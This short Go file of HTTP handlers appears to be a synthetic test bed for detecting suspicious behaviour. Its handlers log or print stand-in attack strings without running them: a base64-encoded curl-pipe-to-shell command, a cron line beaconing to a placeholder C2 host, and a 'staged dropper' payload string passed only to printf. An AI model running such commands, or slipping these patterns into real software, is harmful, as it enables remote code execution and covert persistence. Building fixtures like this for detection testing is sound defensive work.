package handlers

import (
	"encoding/base64"
	"log"
	"net/http"
	"os/exec"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	log.Printf("Tool fetch request for URL: %s", source)

	// Demo/staging tool endpoint - no network fetch performed
	// Return static validation response instead of fetching arbitrary URLs
	http.Error(w, "tool fetch disabled - use approved package manager", http.StatusNotImplemented)
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
